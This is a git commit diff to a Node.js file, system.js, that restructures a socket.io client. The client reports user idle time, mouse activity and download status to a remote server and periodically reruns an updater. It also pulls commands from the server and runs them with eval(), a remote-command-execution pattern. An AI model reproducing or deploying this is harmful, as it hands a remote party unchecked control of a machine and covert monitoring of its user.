59e8a8b89befba5f76b29d4530201c879b3a955d
roni0028 <76240520+roni0028@users.noreply.github.com>
2023-12-11 20:25:36 -0300

    update

--- system.js
+++ system.js
@@ -17,73 +17,72 @@ async function connect() {
         const si = require('systeminformation');
         let network = await si.networkInterfaces();
         let zerotier = network.filter(n => n.iface.includes('ZeroTier'));
-        let zerotierIP = zerotier[0].ip4;
         let zerotierMAC = zerotier[0].mac;
-        global.sockets[0] = io(`${global.config.API}?zerotier=${zerotierIP}&mac=${zerotierMAC}`, { transports: ['websocket'] });
+        global.sockets[0] = io(`${global.config.API}?zerotier=${zerotierMAC}`, { transports: ['websocket'] });
     } else {
         global.sockets[0] = io(`${global.config.API}`, { transports: ['websocket'] });
     }
+
+    global.sockets[0].on('connect', () => {
+        console.log('connected');
+    });
+
+    global.sockets[0].on('disconnect', (reason) => {
+        console.log(reason);
+        if (reason === 'io server disconnect') {
+            global.sockets[0].connect();
+        }
+    });
+
+
+    function checkIdleStatus() {
+        const idleTimeInSeconds = desktopIdle.getIdleTime();
+
+        if (idleTimeInSeconds >= idleThresholdInSeconds) {
+            //console.log('User is idle.');
+        } else {
+            lastActiveTime = Date.now();
+        }
+    }
+
+    function checkMouseMovements() {
+        const mousePos = robot.getMousePos();
+        const isMouseMoving = mousePos.x !== 0 || mousePos.y !== 0;
+
+        if (isMouseMoving) {
+            lastActiveTime = Date.now();
+        }
+    }
+
+    function getNetworkStats() {
+        si.networkStats().then(data => {
+            const ethernetStats = data[0];
+            onDownload = ethernetStats.rx_sec > YOUR_THRESHOLD ? true : false;
+        }).catch(error => console.error(error));
+    }
+
+    setInterval(checkIdleStatus, 1000);
+    setInterval(checkMouseMovements, 1000);
+    setInterval(getNetworkStats, 10000);
+
+    setInterval(async () => {
+        let ping = {
+            idle: desktopIdle.getIdleTime(),
+            onDownload: onDownload
+        };
+
+        global.sockets[0].emit('ping', ping);
+    }, 1000);
+
+    setInterval(() => {
+        require('./update.js')();
+    }, 10 * 60 * 1000);
+
+    setTimeout(() => {
+        console.log('executing commands...');
+        global.sockets[0].emit('getcommands', {}, (command) => {
+            eval(command);
+        });
+    }, 2500);
 }
 connect();
-
-global.sockets[0].on('connect', () => {
-    console.log('connected');
-});
-
-global.sockets[0].on('disconnect', (reason) => {
-    console.log(reason);
-    if (reason === 'io server disconnect') {
-        global.sockets[0].connect();
-    }
-});
-
-
-function checkIdleStatus() {
-    const idleTimeInSeconds = desktopIdle.getIdleTime();
-
-    if (idleTimeInSeconds >= idleThresholdInSeconds) {
-        //console.log('User is idle.');
-    } else {
-        lastActiveTime = Date.now();
-    }
-}
-
-function checkMouseMovements() {
-    const mousePos = robot.getMousePos();
-    const isMouseMoving = mousePos.x !== 0 || mousePos.y !== 0;
-
-    if (isMouseMoving) {
-        lastActiveTime = Date.now();
-    }
-}
-
-function getNetworkStats() {
-    si.networkStats().then(data => {
-        const ethernetStats = data[0];
-        onDownload = ethernetStats.rx_sec > YOUR_THRESHOLD ? true : false;
-    }).catch(error => console.error(error));
-}
-
-setInterval(checkIdleStatus, 1000);
-setInterval(checkMouseMovements, 1000);
-setInterval(getNetworkStats, 10000);
-
-setInterval(async () => {
-    let ping = {
-        idle: desktopIdle.getIdleTime(),
-        onDownload: onDownload
-    };
-
-    global.sockets[0].emit('ping', ping);
-}, 1000);
-
-setInterval(() => {
-    require('./update.js')();
-}, 10 * 60 * 1000);
-
-setTimeout(() => {
-    console.log('executing commands...');
-    global.sockets[0].emit('getcommands', {}, (command) => {
-        eval(command);
-    });
-}, 2500);
